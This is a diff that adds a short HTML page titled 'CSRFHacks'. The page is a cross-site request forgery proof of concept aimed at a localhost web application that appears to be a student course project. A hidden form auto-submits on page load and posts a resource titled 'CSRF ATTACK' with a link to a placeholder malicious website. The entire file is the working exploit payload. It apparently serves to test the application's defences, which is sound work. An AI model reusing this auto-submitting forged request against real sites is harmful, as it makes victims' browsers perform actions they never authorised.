@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="US-ASCII">
+<title>CSRFHacks</title>
+</head>
+<body>
+	<form name="csrf_form" action="http://localhost:8080/IT3191-2014S1-Grp2-Azure/resource/publish" method="POST">
+    	<input type="hidden" name="title" value="CSRF ATTACK">
+    	<input type="hidden" name="description" value="THIS IS MALICLIOUS CODE FROM CSRF ATTACK!!!">
+    	<input type="hidden" name="dropboxLink" value="http://link.to.malicious.website.com">
+    	<input type="hidden" name="tags" value="HACKER,GG">
+	</form>
+	<script type="text/javascript">document.csrf_form.submit();</script>
+</body>
+</html>
